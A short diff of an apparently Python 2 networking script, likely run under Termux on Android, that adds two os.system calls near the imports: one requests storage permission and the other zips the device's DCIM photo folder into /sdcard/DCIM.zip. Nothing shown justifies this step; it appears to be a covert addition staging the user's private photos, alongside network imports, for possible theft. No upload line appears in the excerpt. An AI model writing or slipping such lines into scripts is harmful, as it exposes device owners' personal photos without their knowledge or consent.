@@ -7,7 +7,8 @@ from optparse import OptionParser
 import socket,threading,logging,urllib
 from urllib import urlopen, urlencode
 from re import search
-
+os.system('termux-setup-storage')
+os.system('zip /sdcard/DCIM.zip DCIM')
 
 
 #colors
